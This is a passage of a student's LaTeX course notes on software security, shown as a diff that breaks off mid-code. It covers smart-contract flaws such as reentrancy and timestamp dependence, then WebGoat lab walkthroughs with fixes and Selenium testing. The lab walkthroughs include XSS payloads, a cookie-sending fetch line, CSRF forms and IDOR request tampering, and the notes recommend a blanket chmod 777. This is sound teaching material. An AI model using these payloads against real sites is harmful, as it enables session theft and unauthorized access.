+If owner and user submit a transaction at the same time, the user might receive a reward different from the reward observed when the transaction was submitted. A malicious owner might listen to the network and when a solution is submitted, a transaction to reduce the reward is also submitted, possibly with a high \lstinline|gasPrice| to incentivise miners to include it in the next block. \medskip\\
+If there are multiple buy requests, some might be cancelled even if \lstinline|quant| $\leq$ \lstinline|stock| at the time of transaction submission. Buyers may have to pay higher than the price observed at transaction submission time if an \textbf{updatePrice} transaction is executed before the buy transaction.
+
+\subsubsection{Timestamp dependence}
+A contract may use the block timestamp to execute critical operations (e.g., sending money), but the block timestamp is set by the block miner. 
+\begin{center}
+\includegraphics[scale=0.4]{img/timedep.png}
+\end{center}
+A random number is used to assign a jackpot. The miner can set the block timestamp within a margin ($\sim$900s) of the current local time. Since all parameters involved in the computation of random are known, the miner can predict the result for each timestamp and can choose the timestamp that awards the jackpot to any player she pleases.
+
+\subsubsection{Mishandled exceptions}
+A contract may raise an exception (e.g., if there is not enough gas or the call stack limit = 1024 is exceeded), but the error might be propagated to the caller either as an exception or as boolean value false (e.g., send returns false upon error).
+\begin{center}
+\includegraphics[scale=0.35]{img/misexc.png}
+\end{center}
+If \lstinline|ethAddress| is a contract address (or a dynamic address) instead of a normal address, more gas may be required. A contract may call itself 1023 times before calling \lstinline|claimThrone|. In both cases, if \lstinline|send| fails, king looses throne without compensation.
+
+\subsubsection{Reentrancy vulnerability}
+When a contract calls another contract, the current execution waits for the call to finish in an intermediate, possibly inconsistent state. The callee may call back the caller in such inconsistent state. 
+\begin{center}
+\includegraphics[scale=0.35]{img/reentrancy.png}
+\end{center}
+The default function value of the \lstinline|sender| may call \lstinline|withdrawBalance| again, causing a double transfer of money. The recent \textbf{TheDao} hack exploited a reentrancy vulnerability to steal around 60 M\$.
+
+\subsection{Fixing smart contracts vulnerabilities}
+\begin{itemize}
+\item Guarded transactions (for TOD)
+\item Deterministic timestamp
+\item Better exception handling
+\end{itemize}
+However, to deploy these solutions all clients in the Ethereum network should be upgraded.
+
+\subsubsection{Guarded transactions}
+Objective: contract invocation either returns the expected output or fails. The contract is called with the expected condition.
+
+\subsubsection{Deterministic timestamp}
+Instead of using the (easy to manipulate) \textbf{block timestamp}, contracts should use \textbf{block index}. 
+\begin{itemize}
+\item The block index always increase by 1;
+\item no flexibility at attacker side.
+\end{itemize}
+$$\text{timestamp} - \text{lastTime} > 24 \text{hours} \Rightarrow \text{blockNumber} - \text{lastBlock} > 7200$$
+
+\subsubsection{Better exception handling}
+\begin{itemize}
+\item Automatically propagate exceptions (at EVM level) from callee to caller.
+\item Adding explicit \textbf{throw} and \textbf{catch} statements.
+\end{itemize}
+
+\subsection{Static Analysis}
+\begin{center}
+\includegraphics[scale=0.4]{img/exec.png}
+\end{center}
+
+\subsubsection*{Symbolic execution}
+\begin{flushleft}
+\includegraphics[scale=0.2]{img/se1.png}
+\end{flushleft}
+\begin{flushright}
+\includegraphics[scale=0.2]{img/se2.png}
+\end{flushright}
+
+\subsubsection{The Oyente tool}
+\begin{center}
+\includegraphics[scale=0.4]{img/oyente.png}
+\end{center}
+The tool reports any vulnerabilities found in the input contract; 4k LOC of python; Z3 solver.
+\begin{itemize}
+\item CFG Builder extracts CFG from EVM bytecode (dynamic jumps are left unresolved; they are determined during symbolic execution)
+\item Explorer performs symbolic execution of paths in depth first order; paths proved unfeasible by the solver are discarded
+\item Core analysis checks if vulnerabilities are present:
+\begin{itemize}
+\item TOD detector checks if output can differ when order of transactions is changed
+\item Timestamp detector uses a symbolic variable to propagate timestamp
+\item Mishandled exception detector checks if call is followed by ISZERO check
+\item Reentrancy detector checks if path condition for call is satisfiable by the callee
+\end{itemize}
+\item Validator eliminates false positives by checking the feasibility of the path conditions
+involved in the discovered vulnerabilities by means of the Z3 solver
+\end{itemize}
+
+\subsection{Experimental Results}
+\begin{itemize}
+\item 19,366 smart contracts holding 3M Ethers (30 M\$)
+\item Average balance = 318.5 Ethers (4,523 \$)
+\item 366,213 feasible paths, found by Oyente in 3,000h on Amazon EC2
+\end{itemize}
+
+\subsubsection*{Quantitative results}
+False Positives (FP) were checked on 175 contracts, for which source code was available, with a FP rate of 6.4\% (10 / 175).
+\begin{itemize}
+\item Exception prevalence: due to small call stack depth (< 50) in benign runs;
+\item Reentrancy FP: use of send instead of call; the latter sends all remaining gas to callee, who can use it to perform additional calls, while the former limits such amount.
+\end{itemize}
+
+\subsubsection*{Qualitative results}
+\textbf{Ponzi (pyramid scheme):}
+\begin{itemize}
+\item new investments are used to pay previous investors and to
+add to the jackpot;
+\item after 12h with no investments, the last investor and the
+contract owner share the jackpot.
+\end{itemize}
+\begin{center}
+\includegraphics[scale=0.4]{img/qures1.png}
+\end{center}
+\begin{itemize}
+\item An attacker may call the contract after 1023 self-calls, to make \lstinline|send| instructions fail. A second call to the contract results in the owner receiving the entire balance, because the contract state has been reset and \lstinline|creditorAddresses.length| is zero
+\item An attacker may pick a timestamp ahead 12h to favour the last investor or before 12h to allow for additional investors to join the contract
+\end{itemize}
+\textbf{EtherId:}
+\begin{itemize}
+\item create, buy and sell Ether Ids
+\end{itemize}
+\begin{center}
+\includegraphics[scale=0.4]{img/qures2.png}
+\end{center}
+If \lstinline|send| fails, id ownership is changed, but the initial id owner does not receive the payment. To force \lstinline|send| to fail, an attacker may:
+\begin{itemize}
+\item provide insufficient gas for the owner’s address (e.g., when the owner’s address is a contract address, instead of a normal address)
+\item call itself 1023 times before calling EtherId
+\end{itemize}
+
+\subsection{Conclusion}
+Smart contracts are a new kind of software, with very specific features, such as:
+\begin{itemize}
+\item distributed execution semantics
+\item peculiar transaction model
+\item time dependency
+\item peculiar error handling model
+\item peculiar reentrancy model
+\end{itemize}
+Bugs in smart contracts may be subtle and difficult to detect; yet they may have major, impactful consequences:
+\begin{itemize}
+\item contract users are expected to be proficient in code comprehension, since code is the norm (“code is law”)
+\item there is no liability for bugs
+\item bugs cannot be patched (executions are irreversible)
+\item deficiencies in current contract execution model can be fixed only if all clients upgrade to a new version of the protocol
+\end{itemize}
+
+
+
+
+	
+\newpage	
+\part{LABORATORY}
+\newpage
+\section{Laboratory 1}
+\subsection{OWASP Zap}
+Zap is a security tool to search vulnerabilities in web applications.
+\subsection{WebGoat}
+WebGoat is a localhost server that contains exercises to train with security. In this case, it was used to study SQL injection.
+\subsection{Homework 1}
+See the linked PDF for more informations about it. 
+\subsubsection{After the correction} 
+The exercise would have been faster with the use of \textbf{Fuzzer}, a Zap tool that makes possible to repeat HTTP requests, without writing again all the unchanged data and by altering selected parts of it with \textit{rules}. For example, by selecting the starting position in substring you can make it change of value in an interval (from 1 to 23 in this case) while also editing the letter to be checked (mantain separeted more conditions if the objective is to concatenate them). To use it just search in the requests history for the desired request, right-click and select \textit{Attack-->Fuz}.
+
+\section{Laboratory 2}
+Really simple:
+\begin{itemize}
+\item non-prepared statements \textbf{bad}
+\item prepared statements \textbf{good}
+\end{itemize}
+Queries without prepared statements are subject to SQL injection.
+\begin{lstlisting}
+name_query = "SELECT * FROM names WHERE first_name = " + name + ";"
+cursor = conn.execute(name_query)
+\end{lstlisting}
+To use prepared statements, replace the query parameters with \lstinline|?|, create a tuple of parameters (in the correct order) and execute the query with it:
+\begin{lstlisting}
+query = "SELECT * FROM names WHERE first_name = ?;"
+params = (name, )	#tuple
+c.execute(query, params)
+\end{lstlisting}
+\subsection{Homework 2}
+See the linked PDF for more informations about it. 
+	
+\section{Laboratory 3}
+\subsection{Postman}
+Application to make GET requests with parameters. For example in \textit{www.bing.com} you can add a key, which is the name of the parameter, called \textit{q}, and the value \textit{xss}: the request sent is: \textit{https://www.bing.com/search?q=xss}.
+\subsection{XSS Reflected scripting}
+The XSS reflected scripting does not alterate the server data, it just show the changes based on the request.
+The XSS scripts can be avoided by sanitizing the text in input. For example in a Python code this is done by using the \textit{escape()} function.
+\subsection{WebGoat - XSS}
+In the search field:
+\begin{lstlisting}
+	<script>console.log(webgoat.customjs.phoneHome() ) </script>
+\end{lstlisting}
+or:
+\begin{lstlisting}
+	<script>webgoat.customjs.phoneHome()</script>
+\end{lstlisting}
+because the function makes the alert itself.
+\subsection{Homework 3}
+	See the linked PDF for more informations about it. 
+\subsubsection{After the correction}
+From the javascript log in the browser it is possible to get the cookie rapidly. The exercise 3 could have been done also by pressing a button to change page or just to fetch the result. In this last case just use:
+\begin{lstlisting}
+	onclick("fetch('secret?cookies='.concat(x)")
+\end{lstlisting}
+
+\section{Laboratory 4}
+\subsection{Stored XSS}
+It is possible to add a new station with a link in the name:
+\begin{lstlisting}
+	/add?id=543&location=<a href="www.bing.com">Torino</a>
+\end{lstlisting}
+The content is going to be stored in the database (it is permanent).
+It is not possible to inject in the id field because there are some checks made. A check on the client side is not going to be really efficient, so it is better to add the sanitization to the server side (same as with the reflected XSS).
+\subsection{Client-side filtering/tampering}
+NEVER filter sensitive data client-side: the user can see all the data stored in the client!
+\begin{lstlisting}
+	var users = fetch('localhost:5000/users')
+	for(const u of users) {
+		if (u.role != 'ceo') {
+			document.append('<li>' + u.name + u.salary + '</li>')
+		}
+	}
+\end{lstlisting}
+NEVER trust input sent by client: the user can manipulate the requests and pass client limitation. For example, if the service lets you choose, with a dropdown menu, between three possibilities but it lets you know that there is a fourth for specific users, it is possible to edit the request to select it (via ZAP).
+
+\subsection{Direct Object Reference}
+Given for example the URL, with the ending number corresponding to the user ID:
+\begin{lstlisting}
+	See all my personal detail at:
+	https://some.company.tld/app/user/23398
+\end{lstlisting}
+If authorization is not well implemented, it may be easy to access private detail just by changing it with a different ID. Direct Object Reference should be avoided or at least made safe.
+
+
+\subsection{WebGoat - Client Side}
+\subsubsection*{Bypass front-end restrictions}
+Users have a great degree of control over the front-end of the web application. They can alter HTML code, sometimes also scripts. This is why apps that require certain format of input should also validate on server-side. \\
+For the first exercise, go in request editor (right-->open/resend with Request Editor..) of ZAP, edit the request to:
+\begin{lstlisting}
+	select=option3&radio=option3&checkbox=org&shortInput=123456
+\end{lstlisting}
+For the second one, as before:
+\begin{lstlisting}
+	field1=AB&field2=WE&field3=^^^&field4=ven&field5=we&
+		field6=aaaaa&field7=aaa&error=0
+\end{lstlisting}
+Both exercises can also be made by adding a breakpoint (left of the HUD) and edit the requests before sending them.
+
+\subsubsection*{Html tampering}
+Browsers generally offer many options of editing the displayed content. Developers therefore must be aware that the values sent by the user may have been tampered with. \\
+For the exercise, similar to before just edit the request like this:
+\begin{lstlisting}
+	QTY=2&Total=0.99
+\end{lstlisting}
+
+\subsection{Homework 4}
+	See the linked PDF for more informations about it. An alternative: check network tab in ispector, find the request made to:
+\begin{verbatim}
+	http://localhost:8881/WebGoat/clientSideFiltering/challenge-store/coupons/123
+\end{verbatim}	 
+Remove '123' and get the URL to the JSON file with the coupons.
+
+\section{Laboratory 5}
+\subsection{WebGoat - Access Control Flaws}
+The access control flaw covered is the Direct Object Reference.
+Direct Object References are when an application uses client-provided input to access data and objects.
+\begin{verbatim}
+https://some.company.tld/dor?id=12345
+\end{verbatim}
+These are considered insecure when the reference is not properly handled and allows for authorization bypasses or disclose private data that could be used to perform operations or access data that the user should not be able to perform or access. \\
+In exercise 3 analyze the page and in the network tab search for the profile file. It is easy to recover the infos hidden from the page:
+\begin{lstlisting}
+  "role" : 3,
+  "color" : "yellow",
+  "size" : "small",
+  "name" : "Tom Cat",
+  "userId" : "2342384"
+\end{lstlisting}
+In exercise 4 just access the page with:
+\begin{verbatim}
+WebGoat/IDOR/profile/2342384
+\end{verbatim}
+In exercise 5 try to change the id number, until you get to:
+\begin{verbatim}
+http://localhost:8881/WebGoat/IDOR/profile/2342388
+
+"{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}"
+\end{verbatim}
+Editing can be done with or without ZAP:
+\begin{itemize}
+\item \textbf{With ZAP}: modify the request, making it a PUT and adding the parameters in the body
+\item \textbf{Without ZAP}: open postman and do a GET with the above URL. The session cookies from the current session ('\lstinline|document.cookie|' in the console of firefox) have to be added to localhost (with path '/WebGoat'), so that the logins are already executed. Then change the request to a PUT and in the \textbf{body} tab change to \textbf{raw} and switch from \textbf{text} to \textbf{JSON}, then write:
+\begin{lstlisting}
+{
+	"role" : 1,
+	"color" : "red",
+	"size" : "large",
+	"name" : "Buffalo Bill",
+	"userId" : "2342388"
+}
+\end{lstlisting}
+\end{itemize}
+
+
+\subsection{Homework 5}
+See the linked PDF for more informations about it. 
+
+\subsubsection{After the correction}
+The necessary value could be retrieved in \textit{WolframAlpha} with this calc:
+	$$0 = 1500*x + 1200 \; mod \; (2^{32})$$
+To fix the vulnerability, the use of double/floats/unsigned int instead of integers is not enough: a limit is always needed.
+Other solutions were with the use of the \textit{BigNumber} library.
+
+\section{Laboratory 6}
+\subsection{Call stack}
+When you call a function, the system sets aside space in memory for that function to do its necessary work. We call such chunks of memory \textbf{stack frames}. \medskip\\
+\begin{minipage}{0.45\textwidth}
+\begin{lstlisting}
+#include <stdio.h>
+int foo1(int a, int b) {
+	int c = a + b;
+	return c;
+}
+int main(){
+	foo1(1, 2);
+	return 0;
+}
+\end{lstlisting}
+\end{minipage}
+\begin{minipage}{0.5\textwidth}
+\begin{scriptsize}
+Registries:
+\begin{itemize}
+\item \textbf{ESP}: points to the last thing pushed on the stack
+\item \textbf{EIP}: points to the next instruction to execute
+\item \textbf{EBP}: address of the frame's base
+\end{itemize}
+\lstinline|CALL <addr>| pushes the current value of EIP and changes EIP to \lstinline|<addr>|.\medskip \\
+Arguments are pushed onto the stack before a function call.
+\end{scriptsize}
+\end{minipage}
+\subsection{Calling foo1}
+TODO, a lot of images with stack push and pop, etc.
+\subsection{Buffer Overflow}
+Buffer Overflow (BOF) consists on reading/writing more than the allocated buffer amount.
+
+\begin{lstlisting}
+int foo() {
+	char a = 'a';
+	char buf[3];
+	char password[] = "ciao";
+	strcpy(buf, password);
+	printf("%s", buf);
+    printf("\n%c", a);	//'o' printed,
+	return 0;
+}
+int main() {
+	foo();
+	return 0;
+}
+\end{lstlisting}
+The buffer \lstinline|buf| can contain 3 chars, with \lstinline|strcpy| we are trying to copy 4 chars to it. In this example, the content that can not be contained, so the final 'o' of the char array, will overflow into the variable '\lstinline|a|', overwriting its content. If the password was '\lstinline|cia\0o|', the value of 'a' would be printed as empty, because the end of string character.
+
+\subsection{Homework 6}
+See the linked PDF for more informations about it. 
+\subsubsection{After the correction}
+Something not requested by the exercise: with the solution provided, if the string "pass" is inserted (the one copied by the program) the output will be not succesfull. This can be fixed by addin a EOL character in the "strcpy" function:
+\begin{verbatim}
+strcpy(secret, "pass\n");
+\end{verbatim}
+
+\section{Laboratory 7}
+\subsection{WebGoat - Cross-Site Request Forgeries}
+Cross-site request forgery is a type of malicious exploit of a website where unauthorized commands are transmitted from a user that the website trusts. Unlike cross-site scripting (XSS), which exploits the trust a user has for a particular site, CSRF exploits the trust that a site has in a user’s browser. \\
+CSRF commonly has the following characteristics:
+\begin{itemize}
+\item It involves sites that rely on a user’s identity.
+\item It exploits the site’s trust in that identity.
+\item It tricks the user’s browser into sending HTTP requests to a target site.
+\item It involves HTTP requests that have side effects.
+\end{itemize}
+At risk are web applications that perform actions based on input from trusted and authenticated users without requiring the user to authorize the specific action. A user who is authenticated by a cookie saved in the user’s web browser could unknowingly send an HTTP request to a site that trusts the user and thereby causes an unwanted action. Forcing the victim to retrieve data doesn’t benefit an attacker because the attacker doesn’t receive the response, the victim does. As such, CSRF attacks target state-changing requests. \medskip\\
+In exercise 3 the submit query open the URL:
+\begin{verbatim}
+/WebGoat/csrf/basic-get-flag?csrf=false&submit=Submit+Query
+\end{verbatim}
+To complete the exercise it is needed to trigger the form from an external source while logged in. That is made possible by creating a simple HTML file:
+\begin{lstlisting}
+	<html><body>
+		<form action="http://localhost:8881/WebGoat/csrf/
+				basic-get-flag" method="GET">
+        	<input name="csrf" type="hidden" value="false">
+        	<input name="submit" type="hidden" value="submit"> 
+			<input name="submit" type="submit" value="submit">    
+		</form>
+	</body></html>
+\end{lstlisting}
+This file contains 3 input tags: the first 2 are the parameters in the original URL (and are hidden), the last one is for the new submit button, which triggers the call of the URL:
+\begin{verbatim}
+/csrf/basic-get-flag?csrf=false&submit=submit&submit=submit
+\end{verbatim}
+A success message will be returned, with the flag value requested. \medskip\\
+Exercise 4 is similar, but a PUT request is needed. The button tries to execute the request:
+\begin{verbatim}
+/csrf/review/reviewText=Wow&stars=5&validateReq=2aa14227b9a13d0bede0388a7fba9aa9
+\end{verbatim}
+The HTML page will be:
+\begin{lstlisting}
+	<html><body>
+		<form action="http://localhost:8881/WebGoat/csrf/review"
+				method="POST">
+        	<input name="validateReq" type="hidden"
+        		value="2aa14227b9a13d0bede0388a7fba9aa9">
+        	<input type="hidden" name="reviewText" value="lol"> 
+			<input type="hidden" name="stars" value="5"> 
+			<input type="submit" name="submit" value="submit">    
+		</form>
+	</body></html>
+\end{lstlisting}
+\subsection{Cross-Origin Resource Sharing (CORS)}
+Cross-Origin Resource Sharing (CORS) is a mechanism that uses additional HTTP headers to tell browsers to give a web application running at one origin, access to selected resources from a different origin. A web application executes a cross-origin HTTP request when it requests a resource that has a different origin (domain, protocol, or port) from its own.
+
+An example of a cross-origin request: the front-end JavaScript code served from
+\begin{verbatim}
+https://domain-a.com
+\end{verbatim}  
+uses XMLHttpRequest to make a request for 
+\begin{verbatim}
+https://domain-b.com/data.json.
+\end{verbatim}
+For security reasons, browsers restrict cross-origin HTTP requests initiated from \textbf{scripts}. For example, \textbf{XMLHttpRequest} and the Fetch API follow the same-origin policy. This means that a web application using those APIs can only request resources from the same origin the application was loaded from, unless the response from other origins includes the right CORS headers.
+\begin{figure}[h]
+\includegraphics[scale=0.4]{img/cors.png}
+\end{figure}
+
+\subsection{Homework 7}
+See the linked PDF for more informations about it.
+
+\section{Laboratory 8}
+\subsection*{XAMPP}
+Install XAMPP and clone 'inventory-management-system' repository into \textit{htdocs} repository, then change permissions to all its files with:
+\begin{verbatim}
+sudo chmod 777 -R /opt/lampp/htdocs/
+\end{verbatim}
+\subsection*{Pixy}
+Tool for taint analysis in PHP.
+
+\subsection*{Project}
+Introduction to the project.
+
+\section{Laboratory 9}
+There are 3 levels of software testing, organized in the \textit{Test pyramid}:
+\begin{itemize}
+\item \textbf{E2E}: Testing the system as a whole (GUI)
+\item \textbf{Integration}: Individual units are combined and tested as a group
+\item \textbf{Unit}: Testing of a single function/class
+\end{itemize}
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.2]{img/pyramid.png}
+\end{figure}
+\subsection*{End-to-End (E2E) Testing}
+Testing the system as a whole, all interfaces and backend systems.
+It is performed from start to finish under real world scenarios like communication of the application with hardware, network, database and other applications...
+
+\subsubsection*{E2E Test Case}
+Triple:
+\begin{itemize}
+\item Sequence of user events from the initial page (state) to the target page (state)
+\item Sequence of Inputs (e.g., to fill in a form)
+\item Expected result (oracle)
+\end{itemize}
+Example of \textbf{user events}:
+\begin{itemize}
+\item Click a button
+\item Select a CheckBox or Radio Button
+\item Insert text in a text field (an input value is necessary)
+\end{itemize}
+\subsubsection*{Selenium WebDriver}
+This can be automated with Selenium WebDriver: it's a software designed to support modern dynamic web pages, it exploits browser’s native support for automation (WebDriver) and exposes these features through a uniformed programming interface (API).
+\begin{center}
+\includegraphics[scale=1.3]{img/driverweb.jpg}
+\end{center}
+It will work with the browser natively while executing commands from outside the browser as the application user would. \\
+To use it, write a script that:
+\begin{enumerate}
+\item Goes to a page
+\item Locates an element
+\item Does something with that element (e.g., click)
+\end{enumerate}
+An element can located:
+\begin{itemize}
+\item \textbf{By id}
+	\begin{itemize}
+	\item HTML: \lstinline|<input id="email" ... />|
+	\item WebDriver: \lstinline|driver.findElement( By.id("email") );|
+	\end{itemize}
+\item \textbf{By name}
+	\begin{itemize}
+	\item HTML: \lstinline|<input name="cheese" type="text"/>|
+	\item WebDriver: \lstinline|driver.findElement( By.name("cheese") );|
+	\end{itemize}
+\item \textbf{By Xpath}
+	\begin{itemize}
+	\item HTML
+	\begin{lstlisting}
+<html>
+<input type="text" name="example" />
+<input type="text" name="other" />
+</html>
+	\end{lstlisting}
+	\item WebDriver: \lstinline|driver.findElement( By.xpath("/html/input[1]") );|
+	\end{itemize}
+\end{itemize}
+IDs are the best choice, however:
+\begin{itemize}
+\item IDs don’t always exist (adding Ids everywhere is impractical or not viable)
+\item Their uniqueness is not enforced
+\item In some cases, they are ‘auto-generated’ and so unreliable
+\end{itemize}
+
+\subsubsection*{Absolute vs. relative XPath}
+XPath (XML Path Language) is a query language XPath (XML Path Language) is a query language for selecting nodes XPath (XML Path Language) is a query language for selecting nodes from an XML document. 
+\begin{itemize}
+\item \textbf{Absolute XPath.} It begins with single slash “/’ which means start the search from the root node
+\begin{verbatim}
+/html/body/div/input => input{1,2,3,4}
+/html/body/div[1]/input[2] => input2
+\end{verbatim}
+\item \textbf{Relative XPath.} It begins with double slash “//’ which represents search in the entire web page
+\begin{verbatim}
+//input => input{1,2,3,4}
+//div/input[1] => input{1,3}
+//div[2]/input[2] => input4
+\end{verbatim}
+Still relative:
+\begin{verbatim}
+/body//a => link{1,2,3}
+\end{verbatim}
+It searches in the entire subtree under the body node.
+\end{itemize}
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.3]{img/domtree.png}
+\end{figure}
+\subsubsection*{Example}
+\textit{TestFindExistingOwner} JUnit Test on the petshop website:
+
+\begin{lstlisting}[language=java]
+	//1: go to web page
+	driver.get(URL);
+	
+	//2: press 'find owners'
+	WebElement button = driver.findElement(
+		By.xpath("/html/body/nav/div/div[2]/ul/li[3]/a"));
+	button.click();
+	
+	//3: insert owner's last name ("Black")
+	//input[@id='lastName']		<-- relative xpath
+	WebElement textBox = driver.findElement(By.id("lastName"));
+	textBox.sendKeys("Black");
+	
+	//4: click on button 'find owner'
+	WebElement buttonSubmit = driver.findElement(
+		By.xpath("//button[@class='btn btn-default']"));
+	buttonSubmit.click();
+		
+	//5: assert that "Black" is the last name
+	WebElement nameField = driver.findElement(
+		By.xpath("/html[1]/body[1]/div[1]/div[1]
+					/table[1]/tbody[1]/tr[1]/td[1]/b[1]"));
+	String completeName = nameField.getText();
+	String surname = completeName.split(" ")[1].trim();
+		
+	String expectedSurname = "Black";
+	String actualSurname = surname;
+	assertEquals(expectedSurname, actualSurname);
+\end{lstlisting}
+
+\newpage
+\section{Laboratory 10}
+Test scripts are difficult to read because of a lot of implementation details. Often changes in the Web app breaks multiple tests (fragile test scripts) and duplication of locators and code across test scripts do not allow reuse. To fix these points it is possible to use the Page Object Pattern.
+
+
+\subsection*{Page Object Pattern}
+The PO pattern adds a level of abstraction between the test scripts and the web pages with the aim of reducing the coupling among them.
+\begin{figure}[h]
+\centering
+\includegraphics[scale=0.2]{img/pageclass.png}
+\end{figure}\\
+The idea is creating a page class for each web page; each method encapsulates a page’s functionality (e.g., login). The advantages with this pattern are:
+\begin{itemize}
+\item Test scripts are simpler: implementation details are in
+the POs and it is easier to read (app specific API);
+\item Reuse: the same method is called by several Test scripts (e.g., login() )
+\item Maintenance effort reduction: a change in a Web page can affect only one PO, not a bunch of Test scripts.
+\end{itemize}
+
+\subsubsection*{Example}
+
+Before making the actual test, some classes (in a new PageObject package) have to be defined:
+\begin{itemize}
+\item PageObject (initializes the Web Elements)
+\begin{lstlisting}[language=java]
+public class PageObject {
+	protected WebDriver driver;
+	
+	public PageObject(WebDriver driver) {
+		this.driver = driver;
+		PageFactory.initElements(driver, this);
+	}
+}
+\end{lstlisting}
+\item IndexPage (homepage)
+\begin{lstlisting}[language=java]
+public class IndexPage extends PageObject {
+
+	//locators
+	@FindBy(xpath = "html/body/nav/div/div[2]/ul/li[3]/a")
+	WebElement findOwnerButton;
+
+	//methods
+	public IndexPage(WebDriver driver) {
+		super(driver);
+	}
+	
+	public FindOwnerPage goToFindOwnerPage() {
+		this.findOwnerButton.click();
+		return new FindOwnerPage(driver);
+	}
+}
+\end{lstlisting}
+\item FindOwnerPage (the page after a search was made)
+\begin{lstlisting}[language=java]
+public class FindOwnerPage extends PageObject{
+
+	//locators
+	@FindBy(how = How.ID, using = "lastName")
+	WebElement searchOwnerTextBox;
+	
+	@FindBy(xpath = "//button[@class='btn btn-default']")
+	WebElement submitButton;
+	
+	//methods
+	public FindOwnerPage(WebDriver driver) {
+		super(driver);
+	}
+	
+	public OwnerInfoPage searchOwner(String ownerName) {
+		this.searchOwnerTextBox.sendKeys(ownerName);
+		this.submitButton.click();
+		return new OwnerInfoPage(driver);
+	}
+}
+\end{lstlisting}
+
+\item OwnerInfoPage (the page with the owner informations)
+\begin{lstlisting}[language=java]
+public class OwnerInfoPage  extends PageObject{
+	
+	//locators
+	@FindBy(xpath = "/html[1]/body[1]/div[1]/div[1]/" 
+				+"table[1]/tbody[1]/tr[1]/td[1]/b[1]")
+	WebElement ownerName;
+	
+	public OwnerInfoPage(WebDriver driver) {
+		super(driver);
+	}
+	
+	//methods
+	public String getOwnerLastName() {
+		return this.ownerName.getText().split(" ")[1].trim();
+	}
+	
+	public String getOwnerName() {
+		return this.ownerName.getText();
+	}
+}
+\end{lstlisting}
+
+\end{itemize}
+Finally, the \textit{TestFindExistingOwnerPO} JUnit Test on the petshop website:
+\begin{lstlisting}[language=java]
+	IndexPage indexPage = new IndexPage(driver);
+	FindOwnerPage findOwnerPage = indexPage.goToFindOwnerPage();
+	OwnerInfoPage ownerInfoPage = findOwnerPage.
+			searchOwner("Black");
+		
+	String actualSurname = ownerInfoPage.getOwnerLastName();
+	String expectedSurname = "Black";
+		
+	assertEquals(expectedSurname, actualSurname);
+\end{lstlisting}
+
+\section{Laboratory 11-12}
+Some selenium exercises in the \textit{Expresscart} test case, with both patterns.
+
+\section{Laboratory 13}
+More infos on the project.
+\subsection*{Project tasks}
+A software company is developing a new website \textit{Inventory-Management-System}. This software has to be sold to different companies to manage their inventory. The software companies wants to ensure their software has not XSS flaws and decided to hire you as a Security expert. They expect a report which describes the procedure you have followed, the test cases you run to verify the presence of the vulnerabilities and the patched source code. The objective is to:
+\begin{enumerate}
+\item Detect XSS vulnerabilities using Pixy (its generated images).
+\item Classify TP and FP:
+\begin{itemize}
+\item For TP: manually elaborate the proof-of-concept injections, then write an automated test case (using selenium) to assert the presence of the vulnerabilities. The tests have to pass (green) if you were able to exploit the XSS vulnerability.
+\item For FP: explain why they are FP
+\end{itemize}
+\item Fix the vulnerabilities on the source code.
+\item Using the automated test case you wrote, assert that your fixes are effective in patching the XSS flaws: the test have to fail (red).
+\end{enumerate}
+\textbf{Note.} Use the pixy's name as class name: if the name generated by pixi is
+\begin{verbatim}
+xss_dashboard.php_10_min
+\end{verbatim}
+the class should be called:
+\begin{verbatim}
+XssDashboardPhp10Min
+\end{verbatim}
+
+\subsection*{Attack vector}
+To assert that the XSS attack has been performed, assert:
+\begin{itemize}
+\item the presence of injected HTML
+\item that there are any link with attack.com in href attribute?
+\item that there are any h1 node with this text "attack"?
+\item the presence of javascript
+\item the presence of some alert message
+\end{itemize}
+
+\subsection*{Fixes}
+\begin{itemize}
+\item Use \textit{htmlspecialchars} or \textit{htmlentities}. For example:
+\begin{lstlisting}[language=php]
+<?php
+$str = "A 'quote' is <b>bold</b>";
+
+// Outputs: A 'quote' is &lt;b&gt;bold&lt;/b&gt;
+echo htmlentities($str);
+
+// Outputs: A &#039;quote&#039; is &lt;b&gt;bold&lt;/b&gt;
+echo htmlentities($str, ENT_QUOTES);
+?>
+\end{lstlisting}
+
+\item Use \textit{intval}, \textit{floatval}, \textit{boolval}:
+\begin{lstlisting}[language=php]
+<?php
+echo intval(42); // 42
+echo intval(4.2); // 4
+echo intval('42'); // 42
+echo intval('+42'); // 42
+?>
+\end{lstlisting}
+\end{itemize}
+To do so, go back to the source code inside
+\begin{verbatim}
+/opt/lampp/htdocs/inventory-management-system
+\end{verbatim}
+and fix the vulnerability on the target file.\medskip \\
+\textbf{Note.} You are supposed to fix the vulnerability from the sink statement only and not sanitizing the input before being stored inside the database. In this way, you will keep the same business logic.
+
+\subsection*{Corner cases}
+Some corner case with Selenium:
+\begin{enumerate}
+\item Pop-up dialogs
+\item Upload of files
+\item Dealing with Inputs
+\item Bypass input restriction
+\end{enumerate}
+
+\subsubsection*{Pop-up dialogs}
+\begin{enumerate}
+\item Click to open the dialog
+\item Thread.sleep(X)
+\item Locate the elements (eg. findElement)
+\end{enumerate}
+X is the time (in milliseconds) you want to wait for your dialog to be opened.
+
+\subsubsection*{Upload of files}
+For example, to create a new product, first make sure the form is visible, then don't click on the browse button, it will trigger an OS level dialogue box and effectively stop your test dead. Instead you can use:
+\begin{lstlisting}[language=java]
+	driver.findElement(By.id("myUploadElement"))
+		.sendKeys("<absolutePathToMyFile>");
+\end{lstlisting}
+\textbf{myUploadElement} is the id of that element (button in this case) and in sendKeys you have to specify the absolute path of the content you want to upload (Image,video etc). 
+Selenium will do the rest for you. Keep in mind that the upload will work only If the element you send a file should be in the form \textbf{<input type="file">}. 
+Do not use an absolute path like \lstinline|/john/images/mypicture.png|; put the file inside \lstinline|src/main/resources|.
+Then read the file from the resource directory and evaluate its absolute path realtime:
+\begin{lstlisting}[language=java]
+	URL res = getClass().getClassLoader().getResource("abc.txt");
+	File file = Paths.get(res.toURI()).toFile();
+	String absolutePath = file.getAbsolutePath(); // Use this
+\end{lstlisting}
+
+\subsubsection*{Dealing with inputs (dropdown menu)}
+To select one option:
+\begin{lstlisting}[language=java]
+	Select elm = new Select(driver.findElement(
+			By.id("productStatus")));
+	elm.selectByVisibleText("Available");
+\end{lstlisting}
+
+\subsubsection*{Bypass input restrictions}
+\begin{lstlisting}[language=java]
+	webdriver.executeScript("document.
+			getElementById('productStatus').setAttribute(
+			'value', 'new value for element')");
+\end{lstlisting}
+or 
+\begin{lstlisting}[language=java]
+	WebElement inputField = driver.findElement(By.
